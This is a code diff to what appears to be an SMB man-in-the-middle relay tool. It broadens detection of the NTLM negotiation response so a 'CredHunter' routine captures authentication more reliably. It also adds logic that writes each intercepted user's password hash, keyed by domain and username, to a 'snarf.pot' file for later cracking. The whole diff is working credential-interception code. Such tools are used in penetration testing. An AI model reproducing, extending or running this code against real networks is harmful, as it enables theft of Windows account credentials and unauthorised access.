@@ -25,7 +25,7 @@ var auth = require("./smbauth.js");
 
 var Broker = require("./broker.js").Broker;
 
-module.exports.SMBBroker = function() {
+module.exports.SMBBroker = function(globals) {
     var timerID;
     this.super = Broker;
     this.super();
@@ -81,8 +81,15 @@ module.exports.SMBBroker = function() {
                 //   negResult: accept-incomplete (1)
                 //   negResult: accept-completed (0)
                 // the offset was global on: Windows XP, Windows 7, Windows 2008
-                if(packet.buffer.length >= 57 && packet.buffer.readUInt8(57) == 0x01) {
-                    
+
+                // JJS -- I noticed that sometimes the negResult field
+                // is not at 57 bytes in, but at 59 bytes.  I can't
+                // see why by looking at the packets.  For now, this
+                // seems to be not too dangerous...
+
+                if((packet.buffer.length >= 59 && packet.buffer.readUInt8(59) == 0x01) ||
+                   (packet.buffer.length >= 57 && packet.buffer.readUInt8(57) == 0x01)) {
+                    out.blue("Running CredHunter(packet.buffer)");
                     var n = new smb.CredHunter(packet.buffer);
                     out.yellow("Setting Challenge to " + n.challenge);
                     middler.attributes.challenge = n.challenge;
@@ -142,6 +149,25 @@ module.exports.SMBBroker = function() {
                 middler.attributes.winver = n.winver;
                 middler.attributes.hash = n.hash;
                 middler.attributes.hashtype = n.htype;
+
+                // We received a request to record hashes in a file as
+                // they come through.  I added this stuff to the
+                // 'globals' and had to wire the smb broker so that it
+                // receives a reference to globals.  In preliminary
+                // testing, this seems to work well..
+
+                var hashstring = this.getHash(middler);
+
+                if(hashstring != "unknown") {
+                    var userobj = n.domain + "\\" + n.username;
+                    if(globals.hashes[userobj]) {
+                        out.blue("Already recorded a hash for " + userobj);
+                    } else {
+                        out.blue("Writing hash for " + userobj + " to snarf.pot");
+                        globals.hashfile.write(hashstring + "\n");
+                        globals.hashes[userobj] = true;
+                    }
+                }
 
                 // This turns out to be important -- if multiple inbound
                 // connections come in to an SMB server with the "VC" flag
